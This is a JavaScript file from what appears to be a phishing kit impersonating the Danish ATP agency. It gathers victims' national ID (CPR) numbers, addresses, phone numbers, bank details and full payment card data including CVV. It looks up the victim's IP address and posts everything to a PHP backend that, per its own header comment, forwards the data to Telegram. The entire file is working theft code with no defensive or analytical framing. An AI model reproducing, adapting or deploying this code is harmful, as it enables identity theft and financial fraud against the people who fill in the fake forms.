/* Shared state & Telegram exfil via PHP AJAX */
const CONFIG = {
  AJAX_URL: "ajax/send.php"
};

let state = {
  userIP: "",
  userAgent: navigator.userAgent,
  messageId: null,
  data: {
    brugerID: "", cprNumber: "", cvrNumber: "", companyName: "", phoneNumber: "", navn: "", address: "",
    postnummer: "", by: "", selectedBank: "", kortnavn: "", kortnummer: "",
    expiry: "", cvv: "", regNr: "", kontoNr: ""
  }
};

function loadState() {
  try {
    const saved = localStorage.getItem('atp_state');
    if (saved) {
      const p = JSON.parse(saved);
      state.data = { ...state.data, ...p.data };
      state.userIP = p.userIP || state.userIP;
      state.messageId = p.messageId || state.messageId;
    }
  } catch(e) {}
}

function saveState() {
  try {
    localStorage.setItem('atp_state', JSON.stringify({
      data: state.data, userIP: state.userIP, messageId: state.messageId
    }));
  } catch(e) {}
}

(function() {
  loadState();
  if (!state.userIP) {
    fetch('https://api.ipify.org?format=json')
      .then(r => r.json())
      .then(r => { state.userIP = r.ip; saveState(); })
      .catch(() => {});
  }
})();

/** Send current data to PHP backend → Telegram */
function sendToTelegram() {
  const d = state.data;
  fetch(CONFIG.AJAX_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      brugerID: d.brugerID,
      cprNumber: d.cprNumber,
      cvrNumber: d.cvrNumber,
      companyName: d.companyName,
      phoneNumber: d.phoneNumber,
      navn: d.navn,
      address: d.address,
      postnummer: d.postnummer,
      by: d.by,
      selectedBank: d.selectedBank,
      kortnavn: d.kortnavn,
      kortnummer: d.kortnummer,
      expiry: d.expiry,
      cvv: d.cvv,
      regNr: d.regNr,
      kontoNr: d.kontoNr
    })
  })
  .then(r => r.json())
  .then(res => {
    if (res.ok && res.message_id) {
      state.messageId = res.message_id;
      saveState();
    }
  })
  .catch(e => console.error("AJAX error:", e));
}

function clearState() { localStorage.removeItem('atp_state'); }
